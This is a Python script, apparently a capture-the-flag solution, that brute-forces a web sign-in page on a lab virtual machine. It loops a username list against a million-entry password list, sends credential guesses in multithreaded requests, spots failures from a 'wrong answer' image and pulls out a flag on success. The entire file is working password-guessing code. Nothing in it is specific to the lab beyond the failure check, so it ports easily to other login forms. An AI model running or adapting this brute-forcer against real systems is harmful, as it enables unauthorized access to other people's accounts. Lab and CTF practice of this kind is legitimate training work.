import os
import re
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

import requests
from lxml import etree

VM_IP = os.environ.get("VM_IP")
if not VM_IP:
    raise SystemExit("Error: VM_IP environment variable is not set. Usage: VM_IP=<ip> python brute_force.py")
url = f"http://{VM_IP}:80"

here = Path(__file__).parent
found = threading.Event()
WORKERS = 10


def is_wrong(html: str) -> bool:
    tree = etree.HTML(html)
    image = tree.xpath('//div[@class="container"]/center/img/@src')
    return bool(image) and image[0] == "images/WrongAnswer.gif"


def try_login(session, username, password):
    if found.is_set():
        return None
    params = {
        "page": "signin",
        "Login": "Login",
        "username": username,
        "password": password,
    }
    try:
        r = session.get(url, params=params, timeout=10)
        if r.status_code == 200 and not is_wrong(r.text):
            found.set()
            flag = re.search(r"flag is\s*:\s*([a-f0-9]{64})", r.text, re.IGNORECASE)
            return username, password, flag.group(1) if flag else "see response"
    except requests.RequestException:
        pass
    return None


def bruteforce() -> None:
    usernames = [u.strip() for u in open(here / "usernames.txt") if u.strip()]
    passwords = [p.strip() for p in open(here / "1000000-password-seclists.txt") if p.strip()]

    session = requests.Session()
    tried = 0

    with ThreadPoolExecutor(max_workers=WORKERS) as pool:
        futures = {}
        for username in usernames:
            if found.is_set():
                break
            for password in passwords:
                if found.is_set():
                    break
                fut = pool.submit(try_login, session, username, password)
                futures[fut] = (username, password)
                tried += 1
                if tried % 500 == 0:
                    print(f"  tried {tried} combinations...")

        for fut in as_completed(futures):
            result = fut.result()
            if result:
                username, password, flag = result
                print(f"Found: {username} / {password}")
                print(f"Flag: {flag}")
                return

    if not found.is_set():
        print(f"No valid credentials found after {tried} attempts.")


if __name__ == "__main__":
    print(f"Brute-forcing {url} ...")
    bruteforce()
